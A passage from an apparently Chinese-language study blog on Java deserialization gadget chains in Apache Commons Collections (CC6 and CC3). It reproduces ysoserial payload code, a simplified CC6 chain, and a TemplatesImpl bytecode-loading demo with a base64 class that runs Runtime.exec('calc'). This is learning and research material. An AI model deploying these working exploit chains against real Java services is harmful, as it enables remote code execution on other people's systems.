&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>); <span class="comment">// f2 = HashMap.table</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Reflections.setAccessible(f2);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123; <span class="comment">// HashMap &quot;foo&quot;</span></span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将TiedMapEntry set到HashSet中</span></span><br><span class="line">        Reflections.setAccessible(keyField);</span><br><span class="line">        keyField.set(node, entry); <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将HashSet当作对象序列化 在反序列化的时候调用HashSet的readObject</span></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections6.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用到了新的类<code>TiedMapEntry</code>，那就先去浅浅了解一下</p>
<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.map = map; <span class="comment">// 在构造方法中将我们的LazyMap传进去</span></span><br><span class="line">    <span class="keyword">this</span>.key = key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key); <span class="comment">// 调用LazyMap.get()方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object value = <span class="keyword">this</span>.getValue(); <span class="comment">// 调用getValue触发LazyMap.get()</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以在<code>TiedMapEntry</code>上面的逻辑很明显，就是外面调用<code>TiedMapEntry#hashCode</code>=&gt;<code>TiedMapEntry#getValue</code>=&gt;<code>LazyMap#get</code></p>
<h4 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    map = <span class="keyword">new</span> HashMap&lt;&gt;(initialCapacity); <span class="comment">// 实例化一个HashMap类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> map.put(e, PRESENT)==<span class="keyword">null</span>; <span class="comment">// HashMap.put &gt;&gt; HashMap.hash &gt;&gt; e.hashCode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以发现的readObject中有<code>(HashMap)map.put(e,PRESENT)</code>，所以我们可以将<code>TiedMapEntry</code>传进去，从而调用到了<code>TiedMapEntry#hashCode</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    ···</span><br><span class="line">    ···</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="P神のchain"><a href="#P神のchain" class="headerlink" title="P神のchain"></a>P神のchain</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>和ysoserial相比，P神把<code>HashSet</code>删掉了，因为在<code>HashMap</code>的<code>readObject</code>中就会直接调用<code>hash</code>，所以当我们把<code>TiedMapEntry</code>当作key传入之后也就是会直接调用<code>TiedMapEntry.hashCode()</code>，直接完成了这条链子</p>
<p>直接编写这条链子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6ForP</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class,Object[].class</span><br><span class="line">            &#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap, transformerChain); <span class="comment">// 被LazyMap装饰的恶意Map</span></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap, <span class="string">&quot;aa&quot;</span>); <span class="comment">// 将恶意Map传作TiedMapEntry的map对象</span></span><br><span class="line"></span><br><span class="line">        Map expMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">         <span class="comment">// 为了调用TiedMapEntry#hashCode 将tiedMapEntry当作key传给新的HashMap 并将expMap作为对象来序列化</span></span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>); </span><br><span class="line"></span><br><span class="line">        outerMap.remove(<span class="string">&quot;aa&quot;</span>); <span class="comment">// 为了防止前面put的时候也触发hashCode</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将真正的transformers数组set进ChainedTransformer 覆盖掉前面的fakeTransformers</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformerChain,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span></span><br><span class="line">        ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总的来说CC6理解起来并不难，但是ysoserial有一部分代码的作用大概能理解，但是其中具体的逻辑还没有厘清</p>
<h3 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h3><p>（&lt;8u71</p>
<blockquote>
<p>照样这次先自己学着看ysoserial的payload，不懂再看P神的讲解</p>
</blockquote>
<h4 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h4><p>在仔细分析链子之前，我们先来学一下<code>TemplatesImpl</code>类</p>
<h5 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h5><p>首先学习一下字节码是什么</p>
<p>严格来说，java字节码其实仅仅指的是Java虚拟机执行使用的一类指令，通常被存储在.class文件中；总所周知，java是可以跨平台的，只要代码被编译成字节码文件（.class文件）就可以在java虚拟机中运行</p>
<h5 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h5><p><img src="https://img-blog.csdnimg.cn/44f01b0549ea4e47a20d9b9fa42f66cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<ul>
<li>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机 制），在前面没有找到的情况下，执行 findClass </li>
<li>findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在 本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass </li>
<li>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类</li>
</ul>
<blockquote>
<p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中（在本系列文章第一篇 中进行过说明），在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目 标机器上执行任意代码，需要想办法调用构造函数。</p>
</blockquote>
<h5 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h5><p>在利用TemplatesImpl构造攻击链的时候就会涉及到<code>defineClass</code></p>
<p>定义了一个内部类，继承于ClassLoader，在这里还重写了<code>defineClass</code>，默认为default</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">    ……</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且在·<code>TemplatesImpl#defineTransletClasses</code>会存在调用，而<code>_bytecodes</code>又是我们可控的，而<code>defineTransletClasses</code>域是public，所以是可以在外部进行调用的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i]); <span class="comment">// loader 为TransletClassLoader</span></span><br><span class="line">    <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line">    <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">        _transletIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后可以在<code>TemplatesImpl#getTransletInstance</code>发现对<code>defineTransletClasses</code>的调用，但是这个方法是private，再继续跟进调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// _name 不为null</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses(); <span class="comment">// 实现调用 defineClass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现最开始调用的都是public</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory); <span class="comment">// 实例化了TransformerImpl </span></span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties()</span><br><span class="line">	TemplatesImpl#newTransformer()</span><br><span class="line">		TemplatesImpl#getTransletInstance()</span><br><span class="line">			TemplatesImpl#defineTransletClasses()</span><br><span class="line">				TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<blockquote>
<p>另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须 是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。</p>
</blockquote>
<p>所以我们可以先写一个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> TpmlDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloTpml</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloTpml</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译生成字节码文件，并将字节码传到前面我们向利用的<code>defineClass</code>中，再写一个调用的类</p>
<p><img src="https://img-blog.csdnimg.cn/e4fd0dd079c8416a9479367bc178a6d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Define</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAJAoABwAWCgAXABgIABkKABcAGgcAGwcAHAcAHQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAeAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHABwHABsBAApTb3VyY2VGaWxlAQALSGVsbG9ULmphdmEMAA8AEAcAHwwAIAAhAQAEY2FsYwwAIgAjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABkhlbGxvVAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABgAHAAAAAAADAAEACAAJAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAAMAAwAAAAEAAEADQABAAgADgACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQAMAAAABAABAA0AAQAPABAAAQAKAAAAWAACAAIAAAASKrcAAbgAAhIDtgAEV6cABEyxAAEABAANABAABQACAAsAAAAWAAUAAAAUAAQAFwANABsAEAAZABEAHAARAAAAEAAC/wAQAAEHABIAAQcAEwAAAQAUAAAAAgAV&quot;</span>); <span class="comment">// 字节码base64加密之后的字符串</span></span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;null&quot;</span>); <span class="comment">// 不为空就好 无要求</span></span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl()); <span class="comment">// defineTransletClasses方法中会存在调用 防止报错</span></span><br><span class="line"></span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(TemplatesImpl obj, String bytecodes, Object o)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(bytecodes); <span class="comment">// 因为是私有属性 用反射实现设置</span></span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj,o);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/dc911700e5424657a6b1957af664c422.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<h4 id="Ysoserial"><a href="#Ysoserial" class="headerlink" title="Ysoserial"></a>Ysoserial</h4><blockquote>
<p>基于CC1修改的CC3 主要是把InvokeTransformers换成了InstantiateTransformer</p>
</blockquote>
<p>因为官方对于ysoserial出了过滤器，将InvokeTransformers放入了黑名单里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// inert chain for setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">         <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line">      <span class="comment">// real chain for after setup</span></span><br><span class="line">      <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                  <span class="keyword">new</span> Class[] &#123; Templates.class &#125;,</span><br><span class="line">                  <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">      Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span 